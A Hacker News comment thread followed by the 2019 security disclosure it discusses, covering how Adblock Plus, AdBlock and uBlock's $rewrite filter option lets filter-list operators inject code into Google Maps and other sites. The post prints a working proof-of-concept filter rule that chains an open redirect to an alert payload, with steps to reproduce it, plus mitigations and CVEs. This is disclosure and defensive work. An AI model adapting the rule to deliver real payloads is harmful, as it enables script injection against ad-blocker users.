=== Content from news.ycombinator.com_d83f0c1e_20250120_235559.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D19666504) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [SquareWheel](user?id=SquareWheel) [on April 15, 2019](item?id=19666504)   | [parent](item?id=19666148) | [context](context?id=19666504) | [favorite](fave?id=19666504&auth=4d3388b31c14fc300a1b3aa96750c24cb952eb26) | on: [Adblock Plus filter lists may execute arbitrary co...](item?id=19666148)  It's a bit disingenuous to refer to this as an "exploit" all throughout the article. It's a feature, and an intended one at that. It's offering whitelist maintainers more power over their filters. You can disagree with its inclusion in the spec (as I do), but you should make an argument on that premise instead. Calling it an exploit is no different than claiming .exe files are exploits because they allow arbitrary code to run. Or that browser extensions are exploits because they too can manipulate the page. | | --- | --- | --- |  | |  |  | [nneonneo](user?id=nneonneo) [on April 15, 2019](item?id=19667230)   [–]  It’s rightly referred to as a vulnerability; the term exploit is used to describe a realistic scenario that is enabled by the vulnerable code. The problem is that you can’t necessarily trust filter maintainers to be completely honest. Users don’t regularly audit the thousands of rules in their filter lists, so a bad or compromised filter could easily introduce a malicious filter in an update. The $rewrite rule lets a filter change what code is being loaded by a webpage (under certain fairly realistic situations). | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [SquareWheel](user?id=SquareWheel) [on April 15, 2019](item?id=19667517)   | [parent](#19667230) | [next](#19667850) [–]  >The problem is that you can’t necessarily trust filter maintainers to be completely honest. I agree with that, and it's not a strong security model. But my original point is that the author is using a bad faith argument by describing a feature they dislike as an exploit. It's in spec for what the original authors intended. Just like running an executable program is potentially risky, but a design of the system. | | --- | --- | --- | | | |  |  | [williamscales](user?id=williamscales) [on April 15, 2019](item?id=19669698)   | [root](#19667230) | [parent](#19667517) | [next](#19667874) [–]  > the author is using a bad faith argument by describing a feature they dislike as an exploit I read the article and perhaps it's been edited since you commented, but the author states in the introduction that there is a security vulnerability in a feature and provides an exploit. That to me is quite different from calling the feature itself an exploit. > It's in spec for what the original authors intended. Just like running an executable program is potentially risky, but a design of the system. While it's true that it is in spec, I see a big difference in terms of how users experience this situation compared to running an executable program. I see this as more analogous to new feature introduced in an executable format that offers a different security guarantee to what users are already comfortable with. I don't see pointing this out as being in bad faith. | | --- | --- | --- | | | |  |  | [SquareWheel](user?id=SquareWheel) [on April 15, 2019](item?id=19669774)   | [root](#19667230) | [parent](#19669698) | [next](#19667874) [–]  I don't believe it's been edited (or I haven't noticed such an edit). However on a subsequent re-read, I can see the author's usage of the term "exploit" is more specific to his example below (the Google Maps attack demo). While I'd still argue it's "working as intended" (for better or worse), he is at least calling this specific demonstration an exploit rather than the feature as a whole. So I'll step back from that position, at least part way. Thank you for the clarification on that point. | | --- | --- | --- | | | |  |  | [csours](user?id=csours) [on April 15, 2019](item?id=19667874)   | [root](#19667230) | [parent](#19667517) | [prev](#19669698) | [next](#19667850) [–]  User expectation is important. You don't generally have to put warnings on knives that they may cut you, but if you made a coffee mug that sliced peoples lips up you would get in trouble. As a developer, I expect that browser plugins can execute code in some context (though I think general users may not even expect that); but I don't generally expect that plugins will execute code from some arbitrary 3rd party source. | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on April 15, 2019](item?id=19667850)   | [parent](#19667230) | [prev](#19667517) [–]  Users rarely audit extension updates either. You could wake up tomorrow with a new rewrite supporting extension. Would you know? | | --- | --- | --- | | | |  |  | [joombaga](user?id=joombaga) [on April 15, 2019](item?id=19668942)   | [root](#19667230) | [parent](#19667850) [–]  No, and if someone could use that extension to run arbitrary code in my browser I'd consider that an exploit, even if "Added rewrite option" is in the changelog. | | --- | --- | --- | | |
| |  | | --- |   [Consider applying for YC's Spring batch! Applications are open till Feb 11.](https://www.ycombinator.com/apply/) [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from armin.dev_ff013291_20250120_235556.html ===

[Home](https://armin.dev)

[Posts](https://armin.dev/blog)

* [Posts](https://armin.dev/blog)

Apr 15, 2019
# Adblock Plus filter lists may execute arbitrary code in web pages

A new version of [Adblock Plus](https://adblockplus.org) was [released](https://adblockplus.org/releases/adblock-plus-32-for-chrome-firefox-and-opera-released) on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later [AdBlock](https://getadblock.com) followed suit and released support for the new filter option. [uBlock](https://www.ublock.org), being owned by AdBlock, also implemented the feature.

Under certain conditions the `$rewrite` filter option enables the publishers of these extensions and the maintainers of filter lists to inject arbitrary code in web pages.

The affected extensions have more than 100 million active users, and Adblock Plus has several other forks controlled by third-party developers.

The feature is trivial to exploit in order to attack any sufficiently complex web service, including Google services, while attacks are difficult to detect and are deployable in all major browsers.

Considering the nature and implications of the uncovered vulnerabilities, and given that filter lists have been employed in the past for [politically motivated attacks](https://github.com/uBlockOrigin/uBlock-issues/issues/285), details of the exploit chain are publicly disclosed to ensure the fastest possible propagation of upcoming mitigations in the affected browser extensions and web services.

The following CVE identifiers have been assigned for the vulnerable extensions: [CVE-2019-11593](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11593), [CVE-2019-11594](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11594) and [CVE-2019-11595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11595).

[uBlock Origin](https://github.com/gorhill/uBlock) is not vulnerable to the described attack.

## Attack

The `$rewrite` filter option is used by some ad blockers to remove tracking data and block ads by redirecting requests. The option allows rewrites only within the same origin, and requests of `SCRIPT`, `SUBDOCUMENT`, `OBJECT` and `OBJECT_SUBREQUEST` types are not processed.

However, web services can be exploited with the help of this filter option when they use XMLHttpRequest or Fetch to download code snippets for execution, while allowing requests to arbitrary origins and hosting a server-side open redirect.

Extensions periodically update filters at intervals determined by filter list operators. Organizations and individuals may be targeted based on the IP addresses from which the updates are requested, delivering the malicious payload only to targets, while keeping the public filter list unchanged.

The existence of an attack may be difficult to prove, unless the device is monitored during the attack, because threat actors could set a short expiration time for the malicious filter list, which is then replaced with a benign one.

The following criteria must be met for a web service to be exploitable using this method:

1. The page must load a JS string using XMLHttpRequest or Fetch and execute the returned code
2. The page must not restrict origins from which it can fetch using Content Security Policy directives, or it must not validate the final request URL before executing the downloaded code
3. The origin of the fetched code must have a server-side open redirect or it must host arbitrary user content

Filter list operators may deliver a rule update such as this:

```
/^https://www.google.com/maps/_/js/k=.*/m=pw/.*/rs=.*/$rewrite=/search?hl=en-US&source=hp&biw=&bih=&q=majestic-ramsons.herokuapp.com&btnI=I%27m+Feeling+Lucky&gbv=1

```

The above rule redirects the target request to Google’s *I’m Feeling Lucky* search service, which then redirects to a page with the payload: `alert(document.domain)`.

Steps for running arbitrary code on Google Maps:

1. Install either Adblock Plus, AdBlock or uBlock in a new browser profile
2. Visit the options of the extension and add the [example filter list](https://majestic-ramsons.herokuapp.com/filter-list.txt), this step is meant to simulate a malicious update to a default filter list
3. Navigate to [Google Maps](https://www.google.com/maps/?hl=en)
4. An alert with “[www.google.com](https://www.google.com)” should pop up after a couple of seconds

Gmail and Google Images also meet the listed conditions to be exploitable.

Google has been notified about the exploit, but the report was closed as “Intended Behavior”, since they consider the potential security issue to be present solely in the mentioned browser extensions. This is an unfortunate conclusion, because the exploit is composed of a set of browser extension and web service vulnerabilities that have been chained together.

Please note that the vulnerability is not limited to Google services, other web services could be affected as well.

## Mitigation

The exploit can be mitigated in the affected web services by whitelisting known origins using the `connect-src` CSP header, or by eliminating server-side open redirects.

Ad blocking extensions should consider dropping support for the `$rewrite` filter option. It’s always possible to abuse the feature to some degree, even if only images or style sheets are allowed to be redirected.

Users may also switch to [uBlock Origin](https://github.com/gorhill/uBlock), which does not support the vulnerable filter option. The feature has been rejected by the maintainer of the extension, citing concerns over [security and performance](https://github.com/uBlockOrigin/uBlock-issues/issues/46#issuecomment-391303700).

As of April 29, 2019 the discussed extensions have been patched, users should update to the latest versions. Vulnerable versions (inclusive): Adblock Plus between 3.2 and 3.5.1, AdBlock between 3.32.0 and 3.44.0, and uBlock between 0.9.5.11 and 0.9.5.14.

---

#### Updates

* April 17, 2019: it has been clarified who can exploit the vulnerability and how attacks may unfold. The safety of uBlock Origin has been further emphasized due to the confusion around the uBlock brand name.
* May 1, 2019: the assigned CVE identifiers and the vulnerable extension versions have been listed.

---

This post and my open source [projects](https://github.com/dessant)
are made possible thanks to the support of awesome backers.
If you’d like to join them, please consider contributing with
[Patreon](https://armin.dev/go/patreon?pr=blog&src=site),
[PayPal](https://armin.dev/go/paypal?pr=blog&src=site) or
[Bitcoin](https://armin.dev/go/bitcoin?pr=blog&src=site).

---

[firefox](https://armin.dev/blog/tags/firefox)[chrome](https://armin.dev/blog/tags/chrome)[browser](https://armin.dev/blog/tags/browser)[extensions](https://armin.dev/blog/tags/extensions)[adblock plus](https://armin.dev/blog/tags/adblock-plus)[security](https://armin.dev/blog/tags/security)[google](https://armin.dev/blog/tags/google)

2019-04-15

[Newer
Google and Mozilla are failing to support browser extension developers](https://armin.dev/blog/2019/08/supporting-browser-extension-developers/)
[Older
Firefox extensions cannot securely clear browsing data](https://armin.dev/blog/2019/03/firefox-extensions-browsing-data-security/)

© 2024 [Armin Sebastian](https://armin.dev) · [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) ·


